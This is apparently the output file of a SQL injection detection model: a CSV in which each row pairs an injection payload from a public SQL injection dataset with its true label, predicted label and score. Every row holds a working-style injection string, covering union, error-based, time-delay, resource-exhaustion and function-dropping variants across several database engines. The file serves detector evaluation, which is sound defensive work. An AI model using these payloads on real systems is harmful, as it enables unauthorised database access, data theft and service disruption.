text,source,true_label,pred_label,score_sqli,correct
"1"" )  where 2312 = 2312 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9987937245715066,1
"-2951"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9974852199319103,1
"-7889""  )  )   as oayf where 1765 = 1765 or 8571 = 8571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9927797632620191,1
if ( 6767 = 5022 )  select 6767 else drop function buii--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9272672374726803,1
"-2601' )  union all select 2866,2866,2866,2866,2866,2866--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8247501092221485,1
"1' )  or elt ( 6272 = 6272,sleep ( 5  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9966186012273244,1
"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9151841344797715,1
"-8709"" or 8571 = 8571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9310429121525267,1
"1%""  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9973936614907624,1
"1'  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gmvk' like 'gmvk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9950410053427998,1
"1 )  union all select null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.993298951542127,1
"1', ( select  ( case when  ( 5586 = 6403 )  then 1 else 5586* ( select 5586 from mysql.db )  end  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9899403171973373,1
1 )  where 1487 = 1487,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9632924692228961,1
"select * from generate_series ( 6730,6730,case when  ( 6730 = 9431 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9678348279013895,1
"-4413%'  )  )   union all select 1345,1345#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999910693448671,1
"1', ( case when 3598 = 2118 then 1 else null end )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9824282463069788,1
-2920'  )  )   or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'rzey' = 'rzey,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9955635827241585,1
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""cecf"" = ""cecf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9976630136042277,1
"1'+ ( select qymy where 8657 = 8657 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9986603014168923,1
"1"" )  as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9998269257083598,1
"1"" )  as uorp where 7208 = 7208",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9637532416348493,1
"-8106%"" )  union all select 2051,2051,2051,2051,2051,2051#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8705113519651609,1
"-5526 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9980911022175851,1
"-3377"" )  or 4982 = 6608#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.912733539703502,1
1' rlike  ( select  ( case when  ( 1916 = 7874 )  then 1 else 0x28 end  )  )   and 'ughq' = 'ughq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999111311218189,1
1' )  where 2511 = 2511 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9996430444903739,1
-9847%'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9997697920164903,1
"1""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( ""tpxo"" like ""tpxo",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9997484885294002,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9699129571283881,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'jxqf' like 'jxqf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.997645585707506,1
"-1332 )  as qtbb where 7261 = 7261 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9993966137107291,1
-6145 or  ( 8459 = 8459 ) *4906-- yklv,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8811658593547247,1
"1"" where 2235 = 2235 union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9988283359159584,1
"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  # qmkh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9909708833103764,1
1%'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9997011151608525,1
-2604  )  )   as sekb where 6897 = 6897 or 1000 = 7683,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9842184478742193,1
1'  )  )   )  rlike  ( select  ( case when  ( 4076 = 4881 )  then 1 else 0x28 end  )  )   and   (  (   ( 'grzs' = 'grzs,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999953645142754,1
1'+ ( select 'rejz' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9993540450029192,1
1'  )  )   as jbcd where 9078 = 9078 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9982555327498962,1
-6353%'  )  )   or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9996993756815776,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9416075139014085,1
"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9254185224416397,1
"1""  )  )   union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9995452203316039,1
"1' or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9871486536822927,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (  'btnl' = 'btnl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9686797598482864,1
"-9098'|| ( select 'xodn' from dual where 8202 = 8202 union all select 8202,8202,8202,8202,8202,8202,8202--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.7859503710187923,1
"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9931070983853078,1
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'bfrq' like 'bfrq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999107833121552,1
( select * from  ( select ( sleep ( 5  )  )   ) srmq ) -- mmjk,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9934194665653483,1
"1"" )  as nyui where 2511 = 2511",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9591058525901526,1
"select sleep ( 5 )  and   (  (   ( ""uvzc"" like ""uvzc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9950945441513706,1
-8010' or  ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9086306168131396,1
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'amjh' = 'amjh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.995596054337909,1
"1"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""hbfr"" like ""hbfr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9955689316868642,1
1 )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 6518 = 6518,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9988972350844978,1
"1""  )  )   as dvpb where 6673 = 6673",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9851214495315126,1
select case when 1802 = 7063 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9775293422346358,1
"1"" and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""krtr"" like ""krtr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9976694184798004,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'nhuk' = 'nhuk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9951060542062558,1
"-6924' )  union all select 2046,2046,2046,2046,2046,2046,2046--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.842830922335483,1
"1'  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'wcmt' = 'wcmt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999393578127705,1
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'cxor' = 'cxor",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9982063074765027,1
-5113'  )  )   )  or 7200 = 3094--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9956328287445569,1
"1%""  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9992265770014338,1
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.976640345386248,1
"1"" )  where 2367 = 2367",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.942323819089808,1
-7707'  )  )   union all select 3172#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999769457310624,1
"1 )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 8600 = 8600",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9981734832057564,1
"1, ( case when 5514 = 9602 then 1 else null end )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.985581027732535,1
"1"" )  where 4905 = 4905 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9987424594483605,1
"end and   (  (  ""cxoi"" = ""cxoi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9601594449868851,1
"-7627%""  )  )   union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.6800273382008268,1
"1  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  5888 = 5888",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9977515945180803,1
-5708 where 3134 = 3134 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9883202368881481,1
"1 )  and make_set ( 8403 = 8403,8899 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9596256448836369,1
1 )  as ptxw where 9873 = 9873,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9502949155971847,1
1'|| ( select 'jslz' where 8405 = 8405 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9995394748458813,1
1  )  )   )  and 4595 = 4595#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9944080767851597,1
"1"" )  where 9093 = 9093",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9652580032289985,1
"1""  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9966674765749512,1
"-5211""  )  )   as bkvr where 4082 = 4082 or 2323 = 8052",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9829454769196827,1
"1'  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'dgwe' like 'dgwe",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9995082938500482,1
"1' in boolean mode )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9977411225613009,1
"1' in boolean mode )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9919361679585574,1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and  ( 1491 = 1491",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.979351513092399,1
"1 )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 7182 = 7182",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9978806626858494,1
"1'+ ( select mumb where 4658 = 4658 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9988308941603097,1
"1 )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 3343 = 3343",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9956810778423012,1
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9865247913906329,1
"select pg_sleep ( 5 )  and  ( ""tpry"" = ""tpry",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9871390163663771,1
"1%""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9998699578090295,1
"-4329' )  union all select 1353,1353,1353,1353,1353,1353#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8802402528260458,1
"1"" )  where 4913 = 4913",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9699957209246726,1
"1""  )  )   )  waitfor delay '0:0:5' and   (  (   ( ""ckht"" = ""ckht",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.998784974432729,1
"1'|| ( select 'flre' where 8250 = 8250 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   ) ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9996073548730384,1
-9434' )  union all select 3106#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999011411704493,1
"1'+ ( select sged where 1181 = 1181 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9972245910508772,1
1 where 8135 = 8135,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8748026244725252,1
1  )  )   as qlkf where 6635 = 6635,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9863244913227146,1
1  )  )   as myxo where 1759 = 1759 union all select null#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9998873625720738,1
"-5054%""  )  )   )  union all select 8263,8263,8263,8263--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9967146394075654,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 'fwok' like 'fwok",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9611093433607432,1
"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and 'vunt' = 'vunt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9979497796129373,1
"-8065""  )  )   )  order by 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9971410084717378,1
"1%""  )  )   )  order by 1#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.998829165769807,1
"1  )  )   as jzzo where 7773 = 7773 union all select null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9995194567301715,1
"1 )  where 3738 = 3738 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9990470262997776,1
"select * from generate_series ( 6414,6414,case when  ( 6414 = 6455 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9483048106742195,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( 'vcgc' like 'vcgc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9750424859963486,1
